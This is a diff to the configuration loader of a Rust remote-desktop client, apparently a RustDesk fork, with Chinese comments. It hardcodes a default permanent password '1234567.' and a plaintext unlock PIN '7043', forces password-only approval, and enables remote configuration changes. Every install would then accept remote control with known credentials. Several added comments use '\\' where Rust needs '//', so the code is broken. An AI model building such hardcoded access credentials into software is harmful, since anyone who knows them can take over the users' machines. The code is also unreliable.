@@ -532,6 +532,21 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+        \\将设置里的【安全-密码】改为成【只允许密码访问】方式
+        if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "password".to_string());
+            store = true;
+        }
+        \\设置里的【安全-密码】切换成【使用固定密码】方式
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+        }
+        \\ 设置为：一次性密码为数字
+        if config.options.get("otp-type") != Some(&"numeric".to_string()) {
+            config.options.insert("otp-type".to_string(), "numeric".to_string());
+            store = true;
+        }
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -543,35 +558,23 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
-        
+        // ========== 新增配置 ==========        
         // 1. 自动设置默认 PIN 码（仅在为空时设置）
         if config.unlock_pin.is_empty() {
             config.unlock_pin = "7043".to_string();  // 明文 PIN
             store = true; 
         }
-        
-        // ========== 新增配置 ==========
-        
         // 2. 关闭局域网发现（默认打勾：拒绝局域网发现）
         if !config.options.contains_key("enable-lan-discovery") {
             config.options.insert("enable-lan-discovery".to_string(), "N".to_string());
             store = true;
         }
-        
         // 3. 允许远程修改配置（默认打勾）
         if !config.options.contains_key("allow-remote-config-modification") {
             config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
             store = true;
         }
-        
-        // ========== 新增配置结束 ==========
-        
-        // 4. 自动注入信任设备配置（注释掉，不处理）
-        // if !config.options.contains_key("trusted_devices") {
-        //     // 这种配置通常不能硬编码，需要根据机器生成
-        //     // 建议留空或通过其他方式处理
-        // }
-        
+        // ========== 新增配置结束 ==========	
         if store {
             config.store();
         }
@@ -669,7 +672,7 @@ impl Config {
         store |= Self::migrate_permanent_password_to_hashed_storage(&mut config);
         if config.password.is_empty() {
             // 使用明文密码，首次保存时会自动加密
-            config.password = "Hi7043am".to_string();
+            config.password = "1234567.".to_string();
             store = true;
         }
         let mut id_valid = false;
@@ -2995,7 +2998,7 @@ pub mod keys {
     pub const OPTION_ALLOW_DEEP_LINK_PASSWORD: &str = "allow-deep-link-password";
     pub const OPTION_ALLOW_DEEP_LINK_SERVER_SETTINGS: &str = "allow-deep-link-server-settings";
     pub const OPTION_ONE_WAY_FILE_TRANSFER: &str = "one-way-file-transfer";
-    pub const OPTION_ALLOW_HTTPS_7043: &str = "allow-https-7043";
+    pub const OPTION_ALLOW_HTTPS_21114: &str = "allow-https-21114";
     pub const OPTION_USE_RAW_TCP_FOR_API: &str = "use-raw-tcp-for-api";
     pub const OPTION_ALLOW_HOSTNAME_AS_ID: &str = "allow-hostname-as-id";
     pub const OPTION_HIDE_POWERED_BY_ME: &str = "hide-powered-by-me";
@@ -3205,7 +3208,7 @@ pub mod keys {
         OPTION_ALLOW_DEEP_LINK_PASSWORD,
         OPTION_ALLOW_DEEP_LINK_SERVER_SETTINGS,
         OPTION_ONE_WAY_FILE_TRANSFER,
-        OPTION_ALLOW_HTTPS_7043,
+        OPTION_ALLOW_HTTPS_21114,
         OPTION_ALLOW_HOSTNAME_AS_ID,
         OPTION_REGISTER_DEVICE,
         OPTION_HIDE_POWERED_BY_ME,
